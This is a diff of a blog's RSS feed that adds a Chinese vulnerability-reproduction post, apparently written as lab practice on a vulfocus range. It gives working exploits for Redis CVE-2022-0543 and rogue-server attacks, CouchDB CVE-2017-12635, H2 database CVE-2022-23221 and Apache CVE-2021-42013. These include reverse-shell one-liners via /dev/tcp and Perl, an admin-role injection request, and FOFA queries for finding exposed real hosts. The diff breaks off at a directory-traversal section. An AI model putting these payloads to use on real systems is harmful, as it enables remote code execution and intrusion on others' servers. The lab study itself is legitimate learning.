@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Sun, 25 Jan 2026 17:28:35 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 26 Jan 2026 19:02:23 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>留言板 | Msg Board</title>
         <link>https://www.retr0.xyz/message/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -122,6 +122,467 @@ document.addEventListener(&#34;pjax:complete&#34;, function () {
 	
 &gt;&lt;/p&gt;
 &lt;center&gt;最后一次在学园祭上演出完的众人&lt;/center&gt;
+</description>
+        </item>
+        <item>
+        <title>1.26 漏洞复现</title>
+        <link>https://www.retr0.xyz/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Mon, 26 Jan 2026 19:02:23 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;blockquote&gt;
+&lt;p&gt;安装vulfocus靶场，下载链接：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;并且下载服务器攻防工具：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;启动靶场&#34;&gt;启动靶场
+&lt;/h2&gt;&lt;p&gt;登陆密码&lt;code&gt;test123&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt; 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）&lt;/p&gt;
+&lt;p&gt;终端执行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo su&lt;/code&gt;	输入登录密码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;docker ps -a&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现9bda的虚拟机&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;docker start 9bda&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;开始实验&#34;&gt;开始实验
+&lt;/h2&gt;&lt;p&gt;在攻击机的浏览器中访问靶场的ip&lt;/p&gt;
+&lt;p&gt;使用用户名:密码&lt;code&gt;admin:admin&lt;/code&gt;登录&lt;/p&gt;
+&lt;p&gt;镜像管理&amp;ndash;镜像管理-一键同步&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;redis系列服务&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;默认端口&lt;code&gt;6379&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;fofa搜索 &lt;code&gt;port=&amp;quot;6379&amp;quot; &amp;amp;&amp;amp; protocol=&amp;quot;redis&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;redis服务默认就是没有用户名和密码的&lt;/p&gt;
+&lt;p&gt;找到服务攻防工具中的redis文件夹中的&lt;strong&gt;Another-Redis-Desktop-Manager&lt;/strong&gt;并安装&lt;/p&gt;
+&lt;h3 id=&#34;rediscve-2022-0543&#34;&gt;Redis：CVE-2022-0543
+&lt;/h3&gt;&lt;p&gt;在vulfocus中搜索该环境并启动，根据弹窗中的IP和端口使用刚才安装的软件连接数据库&lt;/p&gt;
+&lt;p&gt;在软件中打开命令行模式，输入以下漏洞代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;eval &amp;#39;local io_l = package.loadlib(&amp;#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&amp;#34;, &amp;#34;luaopen_io&amp;#34;); local io = io_l(); local f = io.popen(&amp;#34;id&amp;#34;, &amp;#34;r&amp;#34;); local res = f:read(&amp;#34;*a&amp;#34;); f:close(); return res&amp;#39; 0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;rediscnvd-2015-07557&#34;&gt;Redis：CNVD-2015-07557
+&lt;/h3&gt;&lt;p&gt;在服务攻防工具中的redis文件夹中找到&lt;code&gt;redis-rogue-server-master(CNVD-2015-07557).zip&lt;/code&gt;复制到kali环境下解压，使用以下命令运行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod 777 -R ./*
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击端口
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;选择&lt;strong&gt;reverse shell&lt;/strong&gt;反向连接&lt;/p&gt;
+&lt;p&gt;192.168.0.106(攻击IP) 4444	此时kali开&lt;code&gt;nc -lvp 4444&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;此时在nc可以使用一些Linux的命令&lt;/p&gt;
+&lt;h3 id=&#34;rediscnvd-2019-21763&#34;&gt;Redis：CNVD-2019-21763
+&lt;/h3&gt;&lt;p&gt;同样将&lt;code&gt;redis-rogue-getshell(CNVD-2019-21763).zip&lt;/code&gt;转移到kali环境，使用以下命令运行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 redis-master.py -r 目标IP -p 目标端口 -L 攻击IP -P 8888 -f RedisModulesSDK/exp.so -c &amp;#34;id&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;couchdbcve-2017-12635权限绕过&#34;&gt;Couchdb：CVE-2017-12635（权限绕过）
+&lt;/h3&gt;&lt;p&gt;开源数据库，储存数据格式json，js查询语言&lt;/p&gt;
+&lt;p&gt;数据库会开放3个端口，看谁会理你，就打谁&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;1、先创建用户&lt;/p&gt;
+&lt;p&gt;抓包并修改数据包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PUT /_users/org.couchdb.user:usertest1 HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 目标IP:端口
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: en
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/json
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 108
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;#34;type&amp;#34;: &amp;#34;user&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;#34;name&amp;#34;: &amp;#34;usertest1&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;#34;roles&amp;#34;: [&amp;#34;_admin&amp;#34;],
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;#34;roles&amp;#34;: [],
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;#34;password&amp;#34;: &amp;#34;usertest1&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;浏览器网页返回&lt;code&gt;&amp;quot;ok&amp;quot;:true&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2、登录用户授权&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://目标IP:端口/_utils/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;用户名密码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;usertest1:usertest1&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;couchdbcve-2017-12635命令执行&#34;&gt;Couchdb：CVE-2017-12635（命令执行）
+&lt;/h3&gt;&lt;p&gt;在服务攻防工具中的couchdb文件夹中找到&lt;code&gt;couchdb.py&lt;/code&gt;，同样复制到Kali环境。&lt;/p&gt;
+&lt;p&gt;编辑该脚本，编辑目标的ip和端口和自己的ip，例如:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;env&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests.auth&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTPBasicAuth&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://目标IP:端口&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;rb&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;sh -i &amp;gt;&amp;amp; /dev/tcp/自己IP/9988 0&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 以下省略&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;先用nc监听9988端口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc -lvp 9988&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;再执行&lt;code&gt;python couchdb.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;此时目标会反弹shell到本地，可以在nc的终端页面执行命令&lt;/p&gt;
+&lt;h3 id=&#34;h2databasecve-2022-23221&#34;&gt;h2database：CVE-2022-23221
+&lt;/h3&gt;&lt;h4 id=&#34;漏洞一未授权进入&#34;&gt;漏洞一：未授权进入
+&lt;/h4&gt;&lt;p&gt;在JDBC URL中填入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;jdbc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FORBID_CREATION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IGNORE_UNKNOWN_SETTINGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FORBID_CREATION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;点击connect，直接进入了后台&lt;/p&gt;
+&lt;h4 id=&#34;漏洞二rce执行反弹&#34;&gt;漏洞二：RCE执行反弹
+&lt;/h4&gt;&lt;p&gt;在攻击机上创建文件&lt;code&gt;h2database.sql&lt;/code&gt;，内容为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CREATE TABLE test (
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  id INT NOT NULL
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS &amp;#39;//javascript
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java.type(&amp;#34;java.lang.Runtime&amp;#34;).getRuntime().exec(&amp;#34;bash -c {echo,base64编码后的反弹指令}|{base64,-d}|{bash,-i}&amp;#34;);&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#反弹指令示例：bash -i &amp;gt;&amp;amp; /dev/tcp/攻击IP/6666 0&amp;gt;&amp;amp;1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在当前文件夹中启动CMD，执行&lt;code&gt;python -m http.server&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;启动nc监听6666端口，&lt;code&gt;nc -lvvp 6666&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在h2database的登录窗口的JDBC URL填入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM &amp;#39;http://192.168.80.134:8000/h2database.sql&amp;#39;;\
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;点击connect，观察到nc上已经拿到了目标上的root终端。&lt;/p&gt;
+&lt;h3 id=&#34;apachecve-2021-42013&#34;&gt;Apache：CVE-2021-42013
+&lt;/h3&gt;&lt;p&gt;攻击端用nc监听5566端口，&lt;code&gt;nc -lvvp 5566&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用hackbarPOST一段内容，同时用burp抓包&lt;/p&gt;
+&lt;p&gt;修改数据包头（也就是第一行）：&lt;code&gt;POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修改下方的POST内容：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo;perl -e &amp;#39;use Socket;$i=&amp;#34;攻击IP&amp;#34;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;apachecve-2021-41773目录穿越&#34;&gt;Apache：CVE-2021-41773（目录穿越）
+&lt;/h3&gt;&lt;p&gt;fafa搜索&lt;code&gt;server=&amp;quot;Apache/2.4.49&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
